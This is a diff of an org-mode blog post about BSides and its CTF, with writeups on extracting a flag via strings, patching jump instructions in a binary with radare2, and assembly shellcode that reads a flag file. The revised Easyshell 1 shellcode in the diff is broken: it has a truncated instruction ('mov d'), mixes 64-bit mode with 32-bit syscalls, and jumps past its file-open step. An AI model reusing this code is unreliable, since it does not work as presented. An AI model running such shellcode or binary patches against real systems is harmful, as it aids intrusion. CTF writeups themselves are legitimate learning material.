@@ -11,33 +11,33 @@ category: note
 #+END_EXPORT
 
 * Conference
-In my short life, I've seen security conferences move from /"hide the speed,
-quick!"/ to /"Security professionals discuss shifting circumstances in information
-assurance policy"/.
+  In my short life, I've seen security conferences move from /"hide the speed,
+  quick!"/ to /"Security professionals discuss shifting circumstances in information
+  assurance policy"/.
 
-At no other hacker conference is it clearer than at BSides that the racous
-parties and threats of e-violence have been replaced with hushed tones and
-artifical lighting.
+  At no other hacker conference is it clearer than at BSides that the racous
+  parties and threats of e-violence have been replaced with hushed tones and
+  artifical lighting.
 
-Still, because of the conference's stature in the Bay Area, many of the
-intelligensia of the San Francisco haqr scene undoubtedly will make an appearance.
-Lots of drinks were handed out, door security was lax and the hallway track was
-as alive as any other similarly sized conference.
+  Still, because of the conference's stature in the Bay Area, many of the
+  intelligensia of the San Francisco haqr scene undoubtedly will make an appearance.
+  Lots of drinks were handed out, door security was lax and the hallway track was
+  as alive as any other similarly sized conference.
 
-I lost interest in the talks fairly quickly, but a friend invited me to play the
-CTF and I was immediately impressed. The Bsides crew managed to avoid many of
-the lame consecutive challenge formats and structural deficits that have made
-other CTFs tiresome. A large number of challenges tackling very diverse
-subjects. No one group (even 'professional' CTF teams) managed to secure an
-answer to every challenge.
+  I lost interest in the talks fairly quickly, but a friend invited me to play the
+  CTF and I was immediately impressed. The Bsides crew managed to avoid many of
+  the lame consecutive challenge formats and structural deficits that have made
+  other CTFs tiresome. A large number of challenges tackling very diverse
+  subjects. No one group (even 'professional' CTF teams) managed to secure an
+  answer to every challenge.
 
 * Writeups
 
-Because so many of these challenges don't have their answers published by their
-organizers after the event is settled, it's up to the community to put together
-'writeups' of the techniques employed in solving these. 
+  Because so many of these challenges don't have their answers published by their
+  organizers after the event is settled, it's up to the community to put together
+  'writeups' of the techniques employed in solving these. 
 
-Here's a few of those.
+  Here's a few of those.
 
 
 ** NOP
@@ -48,116 +48,116 @@ Here's a few of those.
    your network packet capture software of choice.
 
 ** easy
-    This challenge doesn't require you to perform any reverse engineering as the
-    the flag is visible as a direct =.symstrtab= entry.
+   This challenge doesn't require you to perform any reverse engineering as the
+   the flag is visible as a direct =.symstrtab= entry.
 
-    #+BEGIN_EXAMPLE
+   #+BEGIN_EXAMPLE
 zv@syszv >> strings easy-64 | grep -i flag
 FLAG:db2f62a36a018bce28e46d976e3f9864
-    #+END_EXAMPLE
+   #+END_EXAMPLE
 
 ** Skipper
-    In this challenge I'm going to use one of the best disassemblers available
-    today: [[http://radare.org/r/][radare]] . It is both free and contains many facilities for modifying
-    the binary in various ways (without plugins). (You could also solve this
-    challenge with a debugger very easily)
+   In this challenge I'm going to use one of the best disassemblers available
+   today: [[http://radare.org/r/][radare]] . It is both free and contains many facilities for modifying
+   the binary in various ways (without plugins). (You could also solve this
+   challenge with a debugger very easily)
 
-#+BEGIN_EXAMPLE
-cp tmp/skipper64 /tmp/skipper64-backup # a backup in case you fubar the binary
-r2 /tmp/skipper64
-#+END_EXAMPLE
+   #+BEGIN_EXAMPLE
+   cp tmp/skipper64 /tmp/skipper64-backup # a backup in case you fubar the binary
+   r2 /tmp/skipper64
+   #+END_EXAMPLE
 
-Next, seek the read head to the =main= symbol and tap ~V~ key to bring yourself
-into disassembly.
+   Next, seek the read head to the =main= symbol and tap ~V~ key to bring yourself
+   into disassembly.
 
-#+BEGIN_EXAMPLE
-[0x004026d1]> s main
-#+END_EXAMPLE
+   #+BEGIN_EXAMPLE
+   [0x004026d1]> s main
+   #+END_EXAMPLE
 
-#+BEGIN_EXAMPLE
-    0x004026d1      push rbp                                                                                                                                                                                
-    0x004026d2      mov rbp, rsp                                                                                                                                                                            
-    0x004026d5      sub rsp, 0x420                                                                                                                                                                          
-    0x004026dc      mov dword [rbp - 0x414], edi                                                                                                                                                            
-    0x004026e2      mov qword [rbp - 0x420], rsi                                                                                                                                                            
-    0x004026e9      mov rax, qword fs:[0x28]                   ; [0x28:8]=0x3200 ; '('                                                                                                                      
-    0x004026f2      mov qword [rbp - 8], rax                                                                                                                                                                
-    0x004026f6      xor eax, eax                                                                                                                                                                            
-    0x004026f8      lea rax, [rbp - 0x410]                                                                                                                                                                  
-    0x004026ff      mov rdi, rax                                                                                                                                                                            
-    0x00402702      call 0x400b3e                              ;[1]                                                                                                                                         
-    0x00402707      lea rax, [rbp - 0x410]                                                                                                                                                                  
-    0x0040270e      mov rsi, rax                                                                                                                                                                            
-    0x00402711      mov edi, str.Computer_name:__s_n           ; "Computer name: %s." @ 0x402987                                                                                                            
-    0x00402716      mov eax, 0                                                                                                                                                                              
-    0x0040271b      call sym.imp.printf                        ;[2]                                                                                                                                         
-    0x00402720      lea rax, [rbp - 0x410]                                                                                                                                                                  
-    0x00402727      mov esi, str.hax0rz__                      ; "hax0rz!~" @ 0x40299a                                                                                                                      
-    0x0040272c      mov rdi, rax                                                                                                                                                                            
-    0x0040272f      call sym.imp.strcmp                        ;[3]                                                                                                                                         
-    0x00402734      test eax, eax                                                                                                                                                                           
-┌─< 0x00402736      je 0x40275b                                ;[4]                                                                                                                                         
-│   0x00402738      lea rax, [rbp - 0x410]                                                                                                                                                                  
-│   0x0040273f      mov rsi, rax                                                                                                                                                                            
-│   0x00402742      mov edi, str.Sorry ; "Sorry, your computer's name - %s - is not correct!." @ 0x4029a8                                                    
-│   0x00402747      mov eax, 0                                                                                                                                                                              
-│   0x0040274c      call sym.imp.printf                        ;[2]                                                                                                                                         
-│   0x00402751      mov edi, 9                                                                                                                                                                              
-│   0x00402756      call sym.imp.raise                         ;[5]                                                                                                                                         
-└─> 0x0040275b      lea rax, [rbp - 0x410]                                                                                                                                                                  
-    0x00402762      mov rdi, rax                                                                                                                                                                            
-    0x00402765      call 0x400c4a                              ;[6]                                                                                                                                         
-    0x0040276a      lea rax, [rbp - 0x410]                                                                                                                                                                  
-    0x00402771      mov rsi, rax                                                                                                                                                                            
-    0x00402774      mov edi, str.OS_version:__s_n              ; "OS version: %s." @ 0x4029dc                                                                                                               
-    0x00402779      mov eax, 0                                                                                                                                                                              
-    0x0040277e      call sym.imp.printf                        ;[2]                                                                                                                                         
-    0x00402783      lea rax, [rbp - 0x410]                                                                                                                                                                  
-    0x0040278a      mov esi, str.2.4.31                        ; "2.4.31" @ 0x4029ec                                                                                                                        
-    0x0040278f      mov rdi, rax                                                                                                                                                                            
-    0x00402792      call sym.imp.strcmp                        ;[3]                                                                                                                                         
-    0x00402797      test eax, eax                                                                                                                                                                           
-┌─< 0x00402799      je 0x4027e3                                ;[7]                                                                                                                                         
-│   0x0040279b      lea rax, [rbp - 0x410]                                                                                                                                                                  
-│   0x004027a2      mov rsi, rax                                                                                                                                                                            
-│   0x004027a5      mov edi, str.Sorry__your_OS_version____s___is_not_supported__n
-#+END_EXAMPLE
+   #+BEGIN_EXAMPLE
+       0x004026d1      push rbp                                                                                                                                                                                
+       0x004026d2      mov rbp, rsp                                                                                                                                                                            
+       0x004026d5      sub rsp, 0x420                                                                                                                                                                          
+       0x004026dc      mov dword [rbp - 0x414], edi                                                                                                                                                            
+       0x004026e2      mov qword [rbp - 0x420], rsi                                                                                                                                                            
+       0x004026e9      mov rax, qword fs:[0x28]                   ; [0x28:8]=0x3200 ; '('                                                                                                                      
+       0x004026f2      mov qword [rbp - 8], rax                                                                                                                                                                
+       0x004026f6      xor eax, eax                                                                                                                                                                            
+       0x004026f8      lea rax, [rbp - 0x410]                                                                                                                                                                  
+       0x004026ff      mov rdi, rax                                                                                                                                                                            
+       0x00402702      call 0x400b3e                              ;[1]                                                                                                                                         
+       0x00402707      lea rax, [rbp - 0x410]                                                                                                                                                                  
+       0x0040270e      mov rsi, rax                                                                                                                                                                            
+       0x00402711      mov edi, str.Computer_name:__s_n           ; "Computer name: %s." @ 0x402987                                                                                                            
+       0x00402716      mov eax, 0                                                                                                                                                                              
+       0x0040271b      call sym.imp.printf                        ;[2]                                                                                                                                         
+       0x00402720      lea rax, [rbp - 0x410]                                                                                                                                                                  
+       0x00402727      mov esi, str.hax0rz__                      ; "hax0rz!~" @ 0x40299a                                                                                                                      
+       0x0040272c      mov rdi, rax                                                                                                                                                                            
+       0x0040272f      call sym.imp.strcmp                        ;[3]                                                                                                                                         
+       0x00402734      test eax, eax                                                                                                                                                                           
+   ┌─< 0x00402736      je 0x40275b                                ;[4]                                                                                                                                         
+   │   0x00402738      lea rax, [rbp - 0x410]                                                                                                                                                                  
+   │   0x0040273f      mov rsi, rax                                                                                                                                                                            
+   │   0x00402742      mov edi, str.Sorry ; "Sorry, your computer's name - %s - is not correct!." @ 0x4029a8                                                    
+   │   0x00402747      mov eax, 0                                                                                                                                                                              
+   │   0x0040274c      call sym.imp.printf                        ;[2]                                                                                                                                         
+   │   0x00402751      mov edi, 9                                                                                                                                                                              
+   │   0x00402756      call sym.imp.raise                         ;[5]                                                                                                                                         
+   └─> 0x0040275b      lea rax, [rbp - 0x410]                                                                                                                                                                  
+       0x00402762      mov rdi, rax                                                                                                                                                                            
+       0x00402765      call 0x400c4a                              ;[6]                                                                                                                                         
+       0x0040276a      lea rax, [rbp - 0x410]                                                                                                                                                                  
+       0x00402771      mov rsi, rax                                                                                                                                                                            
+       0x00402774      mov edi, str.OS_version:__s_n              ; "OS version: %s." @ 0x4029dc                                                                                                               
+       0x00402779      mov eax, 0                                                                                                                                                                              
+       0x0040277e      call sym.imp.printf                        ;[2]                                                                                                                                         
+       0x00402783      lea rax, [rbp - 0x410]                                                                                                                                                                  
+       0x0040278a      mov esi, str.2.4.31                        ; "2.4.31" @ 0x4029ec                                                                                                                        
+       0x0040278f      mov rdi, rax                                                                                                                                                                            
+       0x00402792      call sym.imp.strcmp                        ;[3]                                                                                                                                         
+       0x00402797      test eax, eax                                                                                                                                                                           
+   ┌─< 0x00402799      je 0x4027e3                                ;[7]                                                                                                                                         
+   │   0x0040279b      lea rax, [rbp - 0x410]                                                                                                                                                                  
+   │   0x004027a2      mov rsi, rax                                                                                                                                                                            
+   │   0x004027a5      mov edi, str.Sorry__your_OS_version____s___is_not_supported__n
+   #+END_EXAMPLE
 
-You can see here that several functions are being called and compared against
-builtin strings like /hax0r!~/. The context gives you an idea that it's checking
-the hostname, but let's be sure.
+   You can see here that several functions are being called and compared against
+   builtin strings like /hax0r!~/. The context gives you an idea that it's checking
+   the hostname, but let's be sure.
 
-#+BEGIN_EXAMPLE
-[0x004026d1]> s 0x400b3e
-[0x00400b67]> pd 10 @ +64
-0x00400ba7      mov edi, 1
-0x00400bac      call sym.imp.exit
-0x00400bb1      mov ecx, 0
-0x00400bb6      mov edx, 0x40291f                          ; "-n"
-0x00400bbb      mov esi, str.uname                         ; "uname" @ 0x402922
-0x00400bc0      mov edi, str.uname                         ; "uname" @ 0x402922
-0x00400bc5      mov eax, 0
-0x00400bca      call sym.imp.execlp
-0x00400bcf      call sym.imp.__errno_location
-0x00400bd4      mov eax, dword [rax]
-#+END_EXAMPLE
+   #+BEGIN_EXAMPLE
+   [0x004026d1]> s 0x400b3e
+   [0x00400b67]> pd 10 @ +64
+   0x00400ba7      mov edi, 1
+   0x00400bac      call sym.imp.exit
+   0x00400bb1      mov ecx, 0
+   0x00400bb6      mov edx, 0x40291f                          ; "-n"
+   0x00400bbb      mov esi, str.uname                         ; "uname" @ 0x402922
+   0x00400bc0      mov edi, str.uname                         ; "uname" @ 0x402922
+   0x00400bc5      mov eax, 0
+   0x00400bca      call sym.imp.execlp
+   0x00400bcf      call sym.imp.__errno_location
+   0x00400bd4      mov eax, dword [rax]
+   #+END_EXAMPLE
 
-You can see it's calling =uname= here. Before you start changing your system's
-configuration to accommodate, first know it's not possible to set your hostname
-to this value.
+   You can see it's calling =uname= here. Before you start changing your system's
+   configuration to accommodate, first know it's not possible to set your hostname
+   to this value.
 
-This means you are going to either have to use a debugger and manually change
-the =ZF=, =CF=, =OF= or other condition flags or patch up all of the =je=
-instructions.
+   This means you are going to either have to use a debugger and manually change
+   the =ZF=, =CF=, =OF= or other condition flags or patch up all of the =je=
+   instructions.
 
-#+BEGIN_EXAMPLE
-[0x00400b67]> oo+ # This makes the binary writable
-[0x00400b67]> wao jmp @ 0x00402736
-[0x00400b67]> wao jmp @ 0x00402799
-...
-#+END_EXAMPLE
+   #+BEGIN_EXAMPLE
+   [0x00400b67]> oo+ # This makes the binary writable
+   [0x00400b67]> wao jmp @ 0x00402736
+   [0x00400b67]> wao jmp @ 0x00402799
+   ...
+   #+END_EXAMPLE
 
-After this, run the binary and get the flag! ~FLAG:f51579e9ca38ba87d71539a9992887ff~
+   After this, run the binary and get the flag! ~FLAG:f51579e9ca38ba87d71539a9992887ff~
 
 
 ** TODO Skipper2
@@ -165,67 +165,63 @@ After this, run the binary and get the flag! ~FLAG:f51579e9ca38ba87d71539a999288
 ** Easyshell 1 
    Both of the easyshell puzzles are warmups who run any shellcode sent on the
    wire. However, you can't use some of the most common shellcode for spawning
-=/bin/sh= as there is no remote shell. This shellcode reads the file
+   =/bin/sh= as there is no remote shell. This shellcode reads the file
    =/home/ctf/flag.txt=
 
    Compile with ~nasm -f bin flag.asm~
 
-#+BEGIN_SRC asm
-BITS 32
+   #+BEGIN_SRC nasm
+BITS 64
 section .text
+
 _start:
-	xor	%eax, %eax
-	xor	%ebx, %ebx
-	xor	%ecx, %ecx
-	xor	%edx, %edx
-	jmp	two
+  xor    eax,eax
+  xor    ebx,ebx
+  xor    ecx,ecx
+  xor    edx,edx
+  jmp    read
 
 one:
-	pop	%ebx
-	
-	movb	$5, %al
-	xor	%ecx, %ecx
-	int	$0x80
-	
-	mov	%eax, %esi
-	jmp	read
+  pop    rbx
+  mov    al,0x5
+  xor    ecx,ecx
+  int    0x80
+  mov    esi,eax
+  jmp    read
 
 exit:
-	movb	$1, %al
-	xor	%ebx, %ebx
-	int	$0x80
+  mov    al,0x1
+  xor    ebx,ebx
+  int    0x80
 
 read:
-	mov	%esi, %ebx
-	movb	$3, %al
-	sub	$1, %esp
-	lea	(%esp), %ecx
-	movb	$1, %dl
-	int	$0x80
-
-	xor	%ebx, %ebx
-	cmp	%eax, %ebx
-	je	exit
-
-	movb	$4, %al
-	movb	$1, %bl
-	movb	$1, %dl
-	int	$0x80
-	
-	add	$1, %esp
-	jmp	read
+  mov    ebx,esi
+  mov    al,0x3
+  sub    esp,0x1
+  lea    ecx,[rsp]
+  mov    dl,0x1
+  int    0x80
+  xor    ebx,ebx
+  cmp    ebx,eax
+  je     exit
+  mov    al,0x4
+  mov    bl,0x1
+  mov    d
+  int    0x80
+  add    esp,0x1
+  jmp    read
 
 two:
-	call	one
-	.string	"/home/ctf/flag.txt"
-#+END_SRC
+  call   one
+  string: db "/home/ctf/flag.txt"
+   #+END_SRC
 
 
 ** Easyshell 2
    Like the prior challenge, you simply just need to write some code to read out
    a file. I used the following.
 
-   #+BEGIN_SRC asm
+   #+BEGIN_SRC nasm
  BITS 64
  section .text
  _start:
@@ -277,7 +273,7 @@ two:
 *** Direct System Call
     Beginning at =0x80487ef=, the core code runs:
 
-    #+BEGIN_SRC asm
+    #+BEGIN_SRC nasm
   call   80486db <get_flag> ;; where the 'flag' is gotten
   add    esp,0x10
   lea    eax,[ebp-0x8c]
@@ -334,7 +330,7 @@ two:
 
     All told, the following shellcode should do just fine.
  
-    #+BEGIN_SRC asm
+    #+BEGIN_SRC nasm
   mov cx, si
   int 0x80
     #+END_SRC
